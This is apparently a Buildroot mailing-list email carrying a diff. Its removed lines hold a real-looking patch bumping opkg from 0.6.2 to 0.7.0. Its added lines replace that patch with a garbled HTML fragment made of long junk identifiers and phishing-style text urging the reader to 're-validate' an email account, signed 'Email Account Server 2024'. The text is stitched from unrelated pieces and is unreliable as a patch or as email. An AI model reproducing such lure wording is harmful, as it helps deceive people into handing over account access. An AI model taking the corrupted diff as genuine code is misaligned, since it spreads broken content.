+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16531" style=3D"margin: 0px; padding:=
+ 0px; font-family: arial, sans-serif;"><span style=3D"font-size: small;"><s=
+pan style=3D"font-family: calibri;">After re-validating your email account =
+all your incoming emails on hold will deliver to your mailbox.<br></span></=
+span>
+<p style=3D"margin: 0px; padding: 0px;"><span style=3D"font-family: calibri=
+; font-size: small;">Regards.<br><strong>Email Account Server 2024</strong>=
+</span></p><font color=3D"#888888">
+<p style=3D"margin: 0px; padding: 0px;"><span style=3D"font-family: calibri=
+; font-size: small;"><strong><a style=3D"color: rgb(17, 85, 204);" href=3D"=
+https://busybox.net">busybox.net</a></strong></span></p></font></td></tr></=
+tbody></table><p></p></body></html>
 
-With toolchain-external-bootlin 2024.05-1 (gcc-13) and opkg 0.6.2:
-
-  opkg install example-snmpd-package_1.0_arm.ipk
-  echo $?
-  255
-
-The new gcc-13 seems to be confused while compiling opkg 0.6.2
-without the "spurious error check" fix [1]
-
-With toolchain-external-bootlin 2024.05-1 (gcc-13) and opkg 0.7.0:
-
-  opkg install example-snmpd-package_1.0_arm.ipk
-  Installing example-snmpd-package (1.0) on root.
-  Configuring example-snmpd-package.
-  Starting SNMP daemon: OK
-  echo $?
-  0
-
-Keep new ACL and XATTRS support introduced in opkg 0.6.3 disabled.
-
-Update opkg to the new upstream url [2].
-
-[1] https://git.yoctoproject.org/opkg/commit?id=b5cc53d56e381803d3f55019254ab7d608160ae1
-[2] https://github.com/openembedded/openembedded-core/commit/6ff8b43e08840582ee8d88261cbaffd33c2304f9
-
-Fixes:
-https://gitlab.com/buildroot.org/buildroot/-/jobs/8199992571
-
-Signed-off-by: Romain Naour <romain.naour@smile.fr>
----
- package/opkg/Config.in | 2 +-
- package/opkg/opkg.hash | 2 +-
- package/opkg/opkg.mk   | 6 ++++--
- 3 files changed, 6 insertions(+), 4 deletions(-)
-
-diff --git a/package/opkg/Config.in b/package/opkg/Config.in
-index 1f6a39343f..ccea63cf7f 100644
---- a/package/opkg/Config.in
-+++ b/package/opkg/Config.in
-@@ -17,7 +17,7 @@ config BR2_PACKAGE_OPKG
- 	  conforms to a subset of debian's policy manual regarding
- 	  control files.
- 
--	  https://code.google.com/archive/p/opkg/
-+	  https://git.yoctoproject.org/opkg/
- 
- if BR2_PACKAGE_OPKG
- 
-diff --git a/package/opkg/opkg.hash b/package/opkg/opkg.hash
-index c6ecefba21..3928a2ce01 100644
---- a/package/opkg/opkg.hash
-+++ b/package/opkg/opkg.hash
-@@ -1,4 +1,4 @@
- # From http://downloads.yoctoproject.org/releases/opkg/SHA256SUMS
--sha256  ac73a90a2549cd04948e563d915912c78e1b8ba0f43af75c5a53fcca474adbd5  opkg-0.6.2.tar.gz
-+sha256  d973fd0f1568f58f87d6aecd9aa95e3e1f60214a45cee26704bf8fe757c54567  opkg-0.7.0.tar.gz
- # Locally calculated
- sha256  32b1062f7da84967e7019d01ab805935caa7ab7321a7ced0e30ebe75e5df1670  COPYING
-diff --git a/package/opkg/opkg.mk b/package/opkg/opkg.mk
-index a550543f3e..f86149a519 100644
---- a/package/opkg/opkg.mk
-+++ b/package/opkg/opkg.mk
-@@ -4,13 +4,15 @@
- #
- ################################################################################
- 
--OPKG_VERSION = 0.6.2
-+OPKG_VERSION = 0.7.0
- OPKG_SITE = https://downloads.yoctoproject.org/releases/opkg
- OPKG_DEPENDENCIES = host-pkgconf libarchive
- OPKG_LICENSE = GPL-2.0+
- OPKG_LICENSE_FILES = COPYING
- OPKG_INSTALL_STAGING = YES
--OPKG_CONF_OPTS = --enable-sha256
-+OPKG_CONF_OPTS = --enable-sha256 \
-+	--without-acl \
-+	--without-xattrs
- 
- ifeq ($(BR2_PACKAGE_OPKG_GPG_SIGN),y)
- OPKG_CONF_OPTS += --enable-gpg
--- 
-2.45.0
+--===============3698983219685555648==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============3698983219685555648==--
